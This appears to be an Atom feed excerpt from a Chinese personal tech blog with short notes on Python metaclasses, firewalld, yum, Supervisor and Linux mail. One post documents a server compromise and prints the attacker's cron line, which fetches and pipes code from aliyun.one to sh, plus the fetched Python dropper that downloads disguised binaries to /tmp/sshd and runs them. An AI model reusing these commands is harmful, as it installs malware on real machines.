    <title>Metaclass</title>
    <link href="http://spiderblog.cn/Metaclass.html"/>
    <id>http://spiderblog.cn/Metaclass.html</id>
    <published>2020-01-11T07:14:42.000Z</published>
    <updated>2020-02-04T06:58:25.762Z</updated>
    
    <content type="html"><![CDATA[<h4 id="元类"><a href="#元类" class="headerlink" title="元类"></a>元类</h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Hello = type(<span class="string">'Hello'</span>, (object,), dict(hello=fn))</span><br></pre></td></tr></table></figure><h4 id="元类-metaclass"><a href="#元类-metaclass" class="headerlink" title="元类 metaclass"></a>元类 metaclass</h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># metaclass允许你创建类或者修改类</span></span><br><span class="line"><span class="comment"># 改变类创建时的行为</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">ListMetaclass</span><span class="params">(type)</span>:</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__new__</span><span class="params">(cls, name, bases, attrs)</span>:</span></span><br><span class="line">        attrs[<span class="string">'add'</span>] = <span class="keyword">lambda</span> self, value: self.append(value)</span><br><span class="line">        <span class="keyword">return</span> type.__new__(cls, name, bases, attrs)</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">MyList</span><span class="params">(list, metaclass=ListMetaclass)</span>:</span></span><br><span class="line">    <span class="keyword">pass</span></span><br></pre></td></tr></table></figure><h4 id="常见的错误类型继承关系"><a href="#常见的错误类型继承关系" class="headerlink" title="常见的错误类型继承关系"></a>常见的错误类型继承关系</h4><p><a href="https://docs.python.org/3/library/exceptions.html#exception-hierarchy" target="_blank" rel="external nofollow noopener noreferrer">官方文档</a></p><h4 id="多线程"><a href="#多线程" class="headerlink" title="多线程"></a>多线程</h4><p><a href="https://www.liaoxuefeng.com/wiki/1016959663602400/1017629247922688" target="_blank" rel="external nofollow noopener noreferrer">廖雪峰-多线程</a></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h4 id=&quot;元类&quot;&gt;&lt;a href=&quot;#元类&quot; class=&quot;headerlink&quot; title=&quot;元类&quot;&gt;&lt;/a&gt;元类&lt;/h4&gt;&lt;figure class=&quot;highlight python&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span
      
    
    </summary>
    
    
      <category term="Metaclass" scheme="http://spiderblog.cn/categories/Metaclass/"/>
    
    
      <category term="Metaclass" scheme="http://spiderblog.cn/tags/Metaclass/"/>
    
  </entry>
  
  <entry>
    <title>Linux-firewalld</title>
    <link href="http://spiderblog.cn/Linux-firewalld.html"/>
    <id>http://spiderblog.cn/Linux-firewalld.html</id>
    <published>2020-01-09T07:12:42.000Z</published>
    <updated>2020-02-04T07:00:40.233Z</updated>
    
    <content type="html"><![CDATA[<h4 id="开启端口"><a href="#开启端口" class="headerlink" title="开启端口"></a>开启端口</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">firewall-cmd --zone&#x3D;public --add-port&#x3D;80&#x2F;tcp --permanent</span><br></pre></td></tr></table></figure><h4 id="查询端口号80-是否开启"><a href="#查询端口号80-是否开启" class="headerlink" title="查询端口号80 是否开启"></a>查询端口号80 是否开启</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">firewall-cmd --query-port&#x3D;80&#x2F;tcp</span><br></pre></td></tr></table></figure><h4 id="重启防火墙"><a href="#重启防火墙" class="headerlink" title="重启防火墙"></a>重启防火墙</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">firewall-cmd --reload</span><br></pre></td></tr></table></figure><h4 id="查询有哪些端口是开启的"><a href="#查询有哪些端口是开启的" class="headerlink" title="查询有哪些端口是开启的"></a>查询有哪些端口是开启的</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">firewall-cmd --list-port</span><br></pre></td></tr></table></figure><h4 id="关闭防火墙"><a href="#关闭防火墙" class="headerlink" title="关闭防火墙"></a>关闭防火墙</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">systemctl stop firewalld.service</span><br></pre></td></tr></table></figure><h4 id="禁止防火墙开机自启"><a href="#禁止防火墙开机自启" class="headerlink" title="禁止防火墙开机自启"></a>禁止防火墙开机自启</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">systemctl disable firewalld.service</span><br></pre></td></tr></table></figure><h4 id="启动防火墙"><a href="#启动防火墙" class="headerlink" title="启动防火墙"></a>启动防火墙</h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">systemctl start firewalld</span><br></pre></td></tr></table></figure>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h4 id=&quot;开启端口&quot;&gt;&lt;a href=&quot;#开启端口&quot; class=&quot;headerlink&quot; title=&quot;开启端口&quot;&gt;&lt;/a&gt;开启端口&lt;/h4&gt;&lt;figure class=&quot;highlight plain&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pr
      
    
    </summary>
    
    
      <category term="Linux" scheme="http://spiderblog.cn/categories/Linux/"/>
    
    
      <category term="Linux" scheme="http://spiderblog.cn/tags/Linux/"/>
    
  </entry>
  
  <entry>
    <title>Linux-utils</title>
    <link href="http://spiderblog.cn/Linux-utils.html"/>
    <id>http://spiderblog.cn/Linux-utils.html</id>
    <published>2020-01-09T06:41:18.000Z</published>
    <updated>2020-02-04T07:02:04.740Z</updated>
    
    <content type="html"><![CDATA[<h4 id="axel"><a href="#axel" class="headerlink" title="axel"></a>axel</h4><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#</span><span class="bash"> 多线程下载工具-替代curl和wget</span></span><br><span class="line"><span class="meta">#</span><span class="bash"> 使用</span></span><br><span class="line">axel -n 20 http://download.redis.io/releases/redis-5.0.7.tar.gz</span><br></pre></td></tr></table></figure>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h4 id=&quot;axel&quot;&gt;&lt;a href=&quot;#axel&quot; class=&quot;headerlink&quot; title=&quot;axel&quot;&gt;&lt;/a&gt;axel&lt;/h4&gt;&lt;figure class=&quot;highlight shell&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pr
      
    
    </summary>
    
    
      <category term="Linux" scheme="http://spiderblog.cn/categories/Linux/"/>
    
    
      <category term="Linux" scheme="http://spiderblog.cn/tags/Linux/"/>
    
  </entry>
  
  <entry>
    <title>Centos7-yum</title>
    <link href="http://spiderblog.cn/Centos7-yum.html"/>
    <id>http://spiderblog.cn/Centos7-yum.html</id>
    <published>2020-01-09T04:04:59.000Z</published>
    <updated>2020-02-04T07:07:43.879Z</updated>
    
    <content type="html"><![CDATA[<h4 id="安装源和更新"><a href="#安装源和更新" class="headerlink" title="安装源和更新"></a>安装源和更新</h4><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#</span><span class="bash"> 这操作很重要，可以避免很多版本性bug</span></span><br><span class="line">yum install -y epel-release</span><br><span class="line">yum update -y</span><br></pre></td></tr></table></figure><h4 id="安装Python"><a href="#安装Python" class="headerlink" title="安装Python"></a>安装Python</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">yum install python36</span><br></pre></td></tr></table></figure><h4 id="安装Redis"><a href="#安装Redis" class="headerlink" title="安装Redis"></a>安装Redis</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">yum install redis</span><br><span class="line"># 配置文件默认在&#x2F;etc&#x2F;redis.conf </span><br><span class="line"># redis-server &#x2F;etc&#x2F;redis.conf  # 运行服务</span><br><span class="line"># redis-cli -a password  # 登录</span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">编译安装redis链接：https:&#x2F;&#x2F;blog.csdn.net&#x2F;qq_39185919&#x2F;article&#x2F;details&#x2F;100564713</span><br></pre></td></tr></table></figure>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h4 id=&quot;安装源和更新&quot;&gt;&lt;a href=&quot;#安装源和更新&quot; class=&quot;headerlink&quot; title=&quot;安装源和更新&quot;&gt;&lt;/a&gt;安装源和更新&lt;/h4&gt;&lt;figure class=&quot;highlight shell&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gut
      
    
    </summary>
    
    
      <category term="Linux" scheme="http://spiderblog.cn/categories/Linux/"/>
    
    
      <category term="Linux" scheme="http://spiderblog.cn/tags/Linux/"/>
    
  </entry>
  
  <entry>
    <title>Hacked-20200109</title>
    <link href="http://spiderblog.cn/Hacked-20200109.html"/>
    <id>http://spiderblog.cn/Hacked-20200109.html</id>
    <published>2020-01-09T03:00:40.000Z</published>
    <updated>2020-02-04T07:07:27.059Z</updated>
    
    <content type="html"><![CDATA[<h4 id="现象"><a href="#现象" class="headerlink" title="现象"></a>现象</h4><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">服务器上的服务挂掉了，使用远程登录也登录不上去，只能控制台强制关机</span><br><span class="line">登录之后，发现一个定时任务，如下：</span><br><span class="line">( curl -fsSL -m180 aliyun.one || wget -q -T180 -O- aliyun.one || python -c 'import urllib;exec(urllib.urlopen("http://aliyun.one/pygo").read())' ) | sh &gt; /dev/null 2&gt;&amp;1</span><br><span class="line">看到exec就知道被入侵了(个人没有写exec的习惯)</span><br></pre></td></tr></table></figure><h4 id="让我康康"><a href="#让我康康" class="headerlink" title="让我康康"></a>让我康康</h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># http://aliyun.one/pygo文件内容如下：</span></span><br><span class="line"><span class="keyword">import</span> urllib</span><br><span class="line"><span class="keyword">import</span> platform</span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> platform.architecture()[<span class="number">0</span>] == <span class="string">"64bit"</span>:</span><br><span class="line">    urlx64 = <span class="string">'http://img.sobot.com/chatres/89/msg/20191225/1/ec0991da601e45c4b0bb6178da5f0cc4.png'</span></span><br><span class="line">    urlx642 = <span class="string">'https://user-images.githubusercontent.com/56861392/71443284-08acf200-2745-11ea-8ef3-509d9072d970.png'</span></span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        f = urllib.urlopen(urlx64)</span><br><span class="line">        <span class="keyword">if</span> f.code == <span class="number">200</span>:</span><br><span class="line">            data = f.read()</span><br><span class="line">            <span class="keyword">with</span> open(<span class="string">"/tmp/sshd"</span>, <span class="string">"wb"</span>) <span class="keyword">as</span> code:</span><br><span class="line">                code.write(data)</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            f2 = urllib.urlopen(urlx642)</span><br><span class="line">            data2 = f2.read()</span><br><span class="line">            <span class="keyword">with</span> open(<span class="string">"/tmp/sshd"</span>, <span class="string">"wb"</span>) <span class="keyword">as</span> code2:</span><br><span class="line">                code2.write(data2)</span><br><span class="line">        os.chmod(<span class="string">"/tmp/sshd"</span>, <span class="number">0o777</span>)</span><br><span class="line">        os.system(<span class="string">"/tmp/sshd"</span>)</span><br><span class="line">    <span class="keyword">except</span>:</span><br><span class="line">        <span class="keyword">pass</span></span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    urlx32 = <span class="string">'http://img.sobot.com/chatres/89/msg/20191225/1/50659157a100466a88fed550423a38ee.png'</span></span><br><span class="line">    urlx322 = <span class="string">'https://user-images.githubusercontent.com/56861392/71443285-08acf200-2745-11ea-96c3-0c2be9135085.png'</span></span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        f = urllib.urlopen(urlx32)</span><br><span class="line">        <span class="keyword">if</span> f.code == <span class="number">200</span>:</span><br><span class="line">            data = f.read()</span><br><span class="line">            <span class="keyword">with</span> open(<span class="string">"/tmp/sshd"</span>, <span class="string">"wb"</span>) <span class="keyword">as</span> code:</span><br><span class="line">                code.write(data)</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            f2 = urllib.urlopen(urlx322)</span><br><span class="line">            data2 = f2.read()</span><br><span class="line">            <span class="keyword">with</span> open(<span class="string">"/tmp/sshd"</span>, <span class="string">"wb"</span>) <span class="keyword">as</span> code2:</span><br><span class="line">                code2.write(data2)</span><br><span class="line">        os.chmod(<span class="string">"/tmp/sshd"</span>, <span class="number">0o777</span>)</span><br><span class="line">        os.system(<span class="string">"/tmp/sshd"</span>)</span><br><span class="line">    <span class="keyword">except</span>:</span><br><span class="line">        <span class="keyword">pass</span></span><br></pre></td></tr></table></figure><h4 id="猜测被入侵原因"><a href="#猜测被入侵原因" class="headerlink" title="猜测被入侵原因"></a>猜测被入侵原因</h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">redis没有设置密码，被入侵也正常</span><br><span class="line">-- 以后各种数据库和中间件一定要设置密码</span><br></pre></td></tr></table></figure><h4 id="解决办法"><a href="#解决办法" class="headerlink" title="解决办法"></a>解决办法</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https:&#x2F;&#x2F;www.v2ex.com&#x2F;t&#x2F;626230  # 看一下别人的讨论</span><br></pre></td></tr></table></figure><h4 id="我的解决办法"><a href="#我的解决办法" class="headerlink" title="我的解决办法"></a>我的解决办法</h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">重装系统</span><br><span class="line">- 用来玩的服务器没有任何有价值的资料</span><br></pre></td></tr></table></figure>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h4 id=&quot;现象&quot;&gt;&lt;a href=&quot;#现象&quot; class=&quot;headerlink&quot; title=&quot;现象&quot;&gt;&lt;/a&gt;现象&lt;/h4&gt;&lt;figure class=&quot;highlight shell&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span 
      
    
    </summary>
    
    
      <category term="Hacker" scheme="http://spiderblog.cn/categories/Hacker/"/>
    
    
      <category term="Hacker" scheme="http://spiderblog.cn/tags/Hacker/"/>
    
  </entry>
  
  <entry>
    <title>Supervisor</title>
    <link href="http://spiderblog.cn/Supervisor.html"/>
    <id>http://spiderblog.cn/Supervisor.html</id>
    <published>2020-01-08T05:33:52.000Z</published>
    <updated>2020-02-04T07:03:12.181Z</updated>
    
    <content type="html"><![CDATA[<h3 id="Supervisor"><a href="#Supervisor" class="headerlink" title="Supervisor"></a>Supervisor</h3><h4 id="专业名称解释"><a href="#专业名称解释" class="headerlink" title="专业名称解释"></a>专业名称解释</h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">supervisor：要安装的软件的名称。</span><br><span class="line">supervisord：装好supervisor软件后，supervisord用于启动supervisor服务。</span><br><span class="line">supervisorctl：用于管理supervisor配置文件中program。</span><br></pre></td></tr></table></figure><h4 id="环境"><a href="#环境" class="headerlink" title="环境"></a>环境</h4><ul><li>centos7</li></ul><h4 id="安装"><a href="#安装" class="headerlink" title="安装"></a>安装</h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">yum install epel-release</span><br><span class="line">yum install -y supervisor</span><br><span class="line">systemctl enable supervisord <span class="comment"># 开机自启动</span></span><br><span class="line">systemctl start supervisord <span class="comment"># 启动supervisord服务</span></span><br><span class="line">systemctl status supervisord <span class="comment"># 查看supervisord服务状态</span></span><br><span class="line">ps -ef|grep supervisord <span class="comment"># 查看是否存在supervisord进程</span></span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"># 可以看到配置文件位置</span><br><span class="line"># 主配置文件在&#x2F;etc&#x2F;supervisord.conf</span><br><span class="line"># 子配置文件放在&#x2F;etc&#x2F;supervisord.d目录里面  # 以.ini结束的配置文件</span><br></pre></td></tr></table></figure><h4 id="配置为supervisor服务"><a href="#配置为supervisor服务" class="headerlink" title="配置为supervisor服务"></a>配置为supervisor服务</h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">vim /usr/lib/systemd/system/supervisord.service</span><br><span class="line"><span class="comment"># 将下面一段配置信息粘贴进去(类似/usr/bin/supervisord的路径需要自己修改对应的)</span></span><br></pre></td></tr></table></figure><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">[Unit]</span><br><span class="line">Description=Process Monitoring <span class="keyword">and</span> Control Daemon</span><br><span class="line">After=rc-local.service nss-user-lookup.target</span><br><span class="line"></span><br><span class="line">[Service]</span><br><span class="line">Type=forking</span><br><span class="line">PIDFile=/var/run/supervisord.pid</span><br><span class="line">ExecStart=/usr/bin/supervisord -c /etc/supervisord.conf</span><br><span class="line">ExecStop=/usr/bin/supervisorctl shutdown</span><br><span class="line">ExecReload=/usr/bin/supervisorctl reload</span><br><span class="line">KillMode=process</span><br><span class="line">Restart=on-failure   <span class="comment"># 非正常退出，会重启</span></span><br><span class="line">RestartSec=<span class="number">42</span>s   <span class="comment"># 重启之前等待42秒</span></span><br><span class="line"></span><br><span class="line">[Install]</span><br><span class="line">WantedBy=multi-user.target</span><br></pre></td></tr></table></figure><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">启动服务</span><br><span class="line">systemctl enable supervisord</span><br><span class="line">检查是否启动成功</span><br><span class="line">systemctl <span class="keyword">is</span>-enabled supervisord  <span class="comment"># 出现enabled，则启动成功</span></span><br></pre></td></tr></table></figure><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 可以使用如下命令管理supervisor服务了</span></span><br><span class="line">systemctl stop supervisord</span><br><span class="line">systemctl start supervisord</span><br><span class="line">systemctl status supervisord</span><br><span class="line">systemctl reload supervisord</span><br><span class="line">systemctl restart supervisord</span><br></pre></td></tr></table></figure><h3 id="supervisor简单使用"><a href="#supervisor简单使用" class="headerlink" title="supervisor简单使用"></a>supervisor简单使用</h3><h4 id="开放到外网"><a href="#开放到外网" class="headerlink" title="开放到外网"></a>开放到外网</h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">port=*:<span class="number">9001</span>                ;Web管理后台运行的IP和端口，如果开放到公网，需要注意安全性</span><br><span class="line">username=user              ;登录管理后台的用户名</span><br><span class="line">password=<span class="number">123</span>               ;登录管理后台的密码</span><br></pre></td></tr></table></figure><h4 id="子进程配置"><a href="#子进程配置" class="headerlink" title="子进程配置"></a>子进程配置</h4><ul><li>讲解</li></ul><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#项目名</span></span><br><span class="line">[program:blog]</span><br><span class="line"><span class="comment">#脚本目录</span></span><br><span class="line">directory=/opt/bin</span><br><span class="line"><span class="comment">#脚本执行命令</span></span><br><span class="line">command=/usr/bin/python /opt/bin/test.py</span><br><span class="line"></span><br><span class="line"><span class="comment">#supervisor启动的时候是否随着同时启动，默认True</span></span><br><span class="line">autostart=true</span><br><span class="line"><span class="comment">#当程序exit的时候，这个program不会自动重启,默认unexpected，设置子进程挂掉后自动重启的情况，有三个选项，false,unexpected和true。如果为false的时候，无论什么情况下，都不会被重新启动，如果为unexpected，只有当进程的退出码不在下面的exitcodes里面定义的</span></span><br><span class="line">autorestart=false</span><br><span class="line"><span class="comment">#这个选项是子进程启动多少秒之后，此时状态如果是running，则我们认为启动成功了。默认值为1</span></span><br><span class="line">startsecs=<span class="number">1</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#脚本运行的用户身份 </span></span><br><span class="line">user = test</span><br><span class="line"></span><br><span class="line"><span class="comment">#日志输出 </span></span><br><span class="line">stderr_logfile=/tmp/blog_stderr.log </span><br><span class="line">stdout_logfile=/tmp/blog_stdout.log </span><br><span class="line"><span class="comment">#把stderr重定向到stdout，默认 false</span></span><br><span class="line">redirect_stderr = true</span><br><span class="line"><span class="comment">#stdout日志文件大小，默认 50MB</span></span><br><span class="line">stdout_logfile_maxbytes = <span class="number">20</span>M</span><br><span class="line"><span class="comment">#stdout日志文件备份数</span></span><br><span class="line">stdout_logfile_backups = <span class="number">20</span></span><br></pre></td></tr></table></figure><ul><li>例子</li></ul><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">[program:test] </span><br><span class="line">directory=/root </span><br><span class="line">command=/usr/sbin/tinyproxy -c /etc/tinyproxy/tinyproxy.conf</span><br><span class="line">autostart=true </span><br><span class="line">autorestart=false </span><br><span class="line">stderr_logfile=/root/tmp/tinyproxy/test_stderr.log </span><br><span class="line">stdout_logfile=/root/tmp/tinyproxy/test_stdout.log </span><br><span class="line"><span class="comment">#user = test</span></span><br></pre></td></tr></table></figure>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h3 id=&quot;Supervisor&quot;&gt;&lt;a href=&quot;#Supervisor&quot; class=&quot;headerlink&quot; title=&quot;Supervisor&quot;&gt;&lt;/a&gt;Supervisor&lt;/h3&gt;&lt;h4 id=&quot;专业名称解释&quot;&gt;&lt;a href=&quot;#专业名称解释&quot; class=&quot;
      
    
    </summary>
    
    
      <category term="Linux" scheme="http://spiderblog.cn/categories/Linux/"/>
    
    
      <category term="Linux" scheme="http://spiderblog.cn/tags/Linux/"/>
    
  </entry>
  
  <entry>
    <title>Linux-nous</title>
    <link href="http://spiderblog.cn/Linux-nous.html"/>
    <id>http://spiderblog.cn/Linux-nous.html</id>
    <published>2020-01-08T04:57:28.000Z</published>
    <updated>2020-02-04T07:12:18.747Z</updated>
    
    <content type="html"><![CDATA[<h4 id="问题"><a href="#问题" class="headerlink" title="问题"></a>问题</h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">You have new mail <span class="keyword">in</span> /var/spool/mail/root</span><br><span class="line"><span class="comment"># 这个提示是LINUX会定时查看LINUX各种状态做汇总，每经过一段时间会把汇总的信息发送的root的邮箱里，以供有需之时查看</span></span><br><span class="line"><span class="comment"># 一般这种情况mail的内容就只是一些正常的系统信息或者是比较重要的错误报告。</span></span><br></pre></td></tr></table></figure><h4 id="解决方案"><a href="#解决方案" class="headerlink" title="解决方案"></a>解决方案</h4><ul><li>关闭提示</li></ul><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">echo &quot;unset MAILCHECK&quot;&gt;&gt; &#x2F;etc&#x2F;profile</span><br><span class="line">source &#x2F;etc&#x2F;profile</span><br></pre></td></tr></table></figure><ul><li>查看</li></ul><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ls -lth &#x2F;var&#x2F;spool&#x2F;mail&#x2F;</span><br></pre></td></tr></table></figure><ul><li>清空</li></ul><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cat &#x2F;dev&#x2F;null &gt; &#x2F;var&#x2F;spool&#x2F;mail&#x2F;root</span><br></pre></td></tr></table></figure>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h4 id=&quot;问题&quot;&gt;&lt;a href=&quot;#问题&quot; class=&quot;headerlink&quot; title=&quot;问题&quot;&gt;&lt;/a&gt;问题&lt;/h4&gt;&lt;figure class=&quot;highlight python&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span
      
    
    </summary>
    
    
      <category term="Linux" scheme="http://spiderblog.cn/categories/Linux/"/>
    
    
      <category term="Linux" scheme="http://spiderblog.cn/tags/Linux/"/>
    
  </entry>
  
</feed>
